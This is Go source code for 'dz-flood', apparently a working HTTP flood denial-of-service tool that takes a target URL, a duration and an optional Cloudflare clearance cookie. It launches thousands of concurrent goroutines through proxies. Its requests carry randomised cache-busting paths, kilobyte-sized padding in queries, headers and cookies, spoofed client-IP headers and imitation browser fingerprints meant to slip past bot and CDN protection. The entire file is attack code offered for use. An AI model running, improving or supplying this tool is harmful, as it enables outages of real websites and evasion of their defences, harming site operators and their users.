package main

import (
"bufio"
"context"
"crypto/tls"
"fmt"
"io"
"log"
"math/rand"
"net"
"net/http"
"net/http/cookiejar"
"net/url"
"os"
"os/signal"
"runtime"
"strconv"
"strings"
"sync"
"syscall"
"time"
)

const (
wrk = 1500
to = 5 * time.Second
sub = 5
Alive = 30 * time.Second
)

type Profile struct {
UA string
Accept string
Lang string
Encoding string
SecChUa string
SecChUaMov string
SecChUaPlat string
Refs []string
ExtraHeaders map[string]string
}

var profiles = []Profile{
{
UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
SecChUaMov: "?0",
SecChUaPlat: "Windows",
Refs: []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="},
ExtraHeaders: map[string]string{
"Upgrade-Insecure-Requests": "1",
"Sec-Fetch-Site": "none",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-Dest": "document",
"Cache-Control": "no-cache",
},},
{
UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: "",
SecChUaMov: "",
SecChUaPlat: "",
Refs: []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q=", "https://www.bing.com/search?q="},
ExtraHeaders: map[string]string{
"Upgrade-Insecure-Requests": "1",
"Sec-Fetch-Site": "none",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-Dest": "document",
"Cache-Control": "no-cache",
},},
{
UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
SecChUaMov: "?0",
SecChUaPlat: "Windows",
Refs: []string{"https://www.bing.com/search?q=", "https://www.google.com/search?q="},
ExtraHeaders: map[string]string{
"Upgrade-Insecure-Requests": "1",
"Sec-Fetch-Site": "none",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-Dest": "document",
"Cache-Control": "no-cache",
},},
{
UA: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
Lang: "en-US,en;q=0.9",
Encoding: "gzip, deflate, br",
SecChUa: "",
SecChUaMov: "",
SecChUaPlat: "",
Refs: []string{"https://www.google.com/search?q="},
ExtraHeaders: map[string]string{
"Upgrade-Insecure-Requests": "1",
"Sec-Fetch-Site": "none",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-Dest": "document",
"Cache-Control": "no-cache",
},},
}

var PTP = []string{
"/",
"/favicon.ico",
"/api",
"/dizflyze",
}

var CBP = []string{
"_",
"cb",
"rnd",
"ts",
"cache",
"v",
"ver",
"t",
"q",
"s",
"page",
"id",
"rand",
"random",
"nonce",
"token",
"hash",
"sig",
"key",
"secret"}

var COOKIES = []string{
"session",
"__cfduid",
"_ga",
"_gid",
"visitor",
"token",
"cf_clearance",
"__cf_bm",
"_gat",
"_fbp",
"_gcl_au",
"_hjid",
"_hjIncludedInSample"}

type CLI struct {
client *http.Client
ip string
}

func init() {
runtime.GOMAXPROCS(runtime.NumCPU())
rand.Seed(time.Now().UnixNano())
}

func RST(rng *rand.Rand, length int) string {
const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
b := make([]byte, length)
for i := range b {
b[i] = chars[rng.Intn(len(chars))]}
return string(b)}

func RIP() string {
return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))}

func RNP() string {
return PTP[rand.Intn(len(PTP))]}

var targetHost string
var customCookie string

func main() {
log.SetOutput(io.Discard)

if len(os.Args) < 2 {
fmt.Println("Tutornya : dz-flood <target> <duration> <cookie>")
fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
os.Exit(1)}
tgt := os.Args[1]
dur := 0
if len(os.Args) >= 3 {
if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
dur = d
}}
if len(os.Args) >= 4 {
customCookie = os.Args[3]}

parsedTarget, _ := url.Parse(tgt)
targetHost = parsedTarget.Host

var proxies []*url.URL
file, err := os.Open("proxy.txt")
if err == nil {
defer file.Close()
scanner := bufio.NewScanner(file)
for scanner.Scan() {
line := strings.TrimSpace(scanner.Text())
if line == "" {
continue
}
if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
line = "http://" + line
}
if p, err := url.Parse(line); err == nil {
proxies = append(proxies, p)}}}
if len(proxies) == 0 {
proxies = append(proxies, nil)}
wcs := make([]CLI, len(proxies))

for i, proxyURL := range proxies {
tr := &http.Transport{
DialContext: (&net.Dialer{
Timeout: 5 * time.Second,
KeepAlive: Alive,
}).DialContext,
DisableKeepAlives: false,
MaxIdleConns: 50000,
MaxIdleConnsPerHost: 50000,
MaxConnsPerHost: 0,
IdleConnTimeout: Alive,
TLSClientConfig: &tls.Config{
InsecureSkipVerify: true,
MinVersion: tls.VersionTLS12,
MaxVersion: tls.VersionTLS13,
NextProtos: []string{"h2", "http/1.1"},
CurvePreferences: []tls.CurveID{
tls.X25519,
tls.CurveP256,
tls.CurveP384,
tls.CurveP521,
},

CipherSuites: []uint16{
tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
},},

ForceAttemptHTTP2: true,
DisableCompression: false,
TLSHandshakeTimeout: 5 * time.Second,
ResponseHeaderTimeout: 3 * time.Second,
ExpectContinueTimeout: 1 * time.Second,
}
ip := ""
if proxyURL != nil {
tr.Proxy = http.ProxyURL(proxyURL)
ip = proxyURL.Hostname()
}
jar, _ := cookiejar.New(nil)
client := &http.Client{
Transport: tr,
Timeout: to,
Jar: jar,
}
wcs[i] = CLI{client: client, ip: ip}
}

fmt.Printf("\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
fmt.Printf("ޗ | Author | Diz Flyze (Consistent)\n")
fmt.Printf("ޗ | Target | %s\n", tgt)
fmt.Printf("ޗ | Time | %d s\n", dur)
fmt.Printf("ޗ | Proxy | %d\n", len(proxies))
fmt.Printf("ޗ | Conc | %d\n", wrk)
fmt.Printf("ޗ | Method | RDT-FLOOD (coherent profiles)\n")
fmt.Printf("ޗ | Ulimit | 1048576\n")
if customCookie != "" {
fmt.Printf("ޗ | Cookie | %s\n", customCookie[:min(30, len(customCookie))])
} else {
fmt.Printf("ޗ | Cookie | False\n")
}
fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")

ctx, cancel := context.WithCancel(context.Background())
defer cancel()

const maxRAMPercent = 80.0
ramCtx, ramCancel := context.WithCancel(ctx)
go func() {
ticker := time.NewTicker(5 * time.Second)
defer ticker.Stop()
var m runtime.MemStats
for {
select {
case <-ramCtx.Done():
return
case <-ticker.C:
runtime.ReadMemStats(&m)
totalMem := uint64(8 * 1024 * 1024 * 1024)
used := m.Sys
percent := float64(used) / float64(totalMem) * 100
if percent > maxRAMPercent {
log.Printf("[•] RAM %.2f%% Exec %.2f%%, Restart", percent, maxRAMPercent)
ramCancel()
os.Exit(1)
}
}
}
}()

if dur > 0 {
time.AfterFunc(time.Duration(dur)*time.Second, func() {
cancel()
})
}

sig := make(chan os.Signal, 1)
signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

var wg sync.WaitGroup
for i := 0; i < wrk; i++ {
wg.Add(1)
c := wcs[i%len(wcs)]
go func(cli CLI, workerID int) {
defer wg.Done()
rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

var swg sync.WaitGroup
for s := 0; s < sub; s++ {
swg.Add(1)
go func(subID int) {
defer swg.Done()
subRng := rand.New(rand.NewSource(rng.Int63()))

for ctx.Err() == nil {
prof := profiles[subRng.Intn(len(profiles))]

baseURL := strings.TrimRight(tgt, "/")
path := RNP()
if subRng.Intn(3) == 0 {
path += "/" + RST(subRng, 4+subRng.Intn(8))
}
if subRng.Intn(3) == 0 {
path += "/" + RST(subRng, 4+subRng.Intn(8))
}
reqURL := baseURL + path

if strings.Contains(reqURL, "?") {
reqURL += "&"
} else {
reqURL += "?"
}
param := CBP[subRng.Intn(len(CBP))]
reqURL += param + "=" + strconv.FormatInt(subRng.Int63(), 10)
reqURL += "&_=" + strconv.FormatInt(time.Now().UnixNano(), 10)
reqURL += "&cb=" + strconv.FormatInt(subRng.Int63(), 16)
if subRng.Intn(2) == 0 {
reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
}
if subRng.Intn(3) == 0 {
reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
}
if subRng.Intn(2) == 0 {
reqURL += "&" + RST(subRng, 10) + "=" + strings.Repeat("y", 512+subRng.Intn(512))
}
if subRng.Intn(2) == 0 {
reqURL += "&nonce=" + strconv.FormatInt(subRng.Int63(), 36)
}

req, _ := http.NewRequest("GET", reqURL, nil)

req.Header.Set("User-Agent", prof.UA)
req.Header.Set("Accept", prof.Accept)
req.Header.Set("Accept-Language", prof.Lang)
req.Header.Set("Accept-Encoding", prof.Encoding)

for k, v := range prof.ExtraHeaders {
req.Header.Set(k, v)
}

if prof.SecChUa != "" {
req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
}

ref := prof.Refs[subRng.Intn(len(prof.Refs))]
ref += RST(subRng, 20) + "=" + strings.Repeat("x", 1024+subRng.Intn(1024))
req.Header.Set("Referer", ref)

if cli.ip != "" {
req.Header.Set("X-Forwarded-For", cli.ip)
} else {
req.Header.Set("X-Forwarded-For", RIP())
}
if subRng.Intn(3) == 0 {
req.Header.Set("X-Real-IP", RIP())
}
if subRng.Intn(5) == 0 {
req.Header.Set("CF-Connecting-IP", RIP())
}
if subRng.Intn(5) == 0 {
req.Header.Set("CDN-Loop", "cloudflare")
}
if subRng.Intn(3) == 0 {
req.Header.Set("True-Client-IP", RIP())
}
if subRng.Intn(5) == 0 {
req.Header.Set("X-Forwarded-Proto", "https")
}
if subRng.Intn(5) == 0 {
req.Header.Set("X-Forwarded-Port", "443")
}

cookieParts := []string{"big=" + strings.Repeat("x", 1024+subRng.Intn(1024))}
if customCookie != "" {
cookieParts = append(cookieParts, customCookie)
}
for _, name := range COOKIES {
if subRng.Intn(2) == 0 {
cookieParts = append(cookieParts, name+"="+strconv.FormatInt(subRng.Int63(), 16))
}
}
req.Header.Set("Cookie", strings.Join(cookieParts, "; "))

if subRng.Intn(2) == 0 {
req.Header.Set("X-Large-Data", strings.Repeat("x", 1024+subRng.Intn(1024)))
}
if subRng.Intn(3) == 0 {
req.Header.Set("X-Bulk-Data", strings.Repeat("x", 1024+subRng.Intn(1024)))
}

resp, err := cli.client.Do(req)
if err == nil {
io.Copy(io.Discard, resp.Body)
resp.Body.Close()}}}(s)}
swg.Wait()}(c, i)}

select {
case <-sig:
cancel()
case <-ctx.Done():}
wg.Wait()}

func min(a, b int) int {
if a < b {
return a
}
return b
}
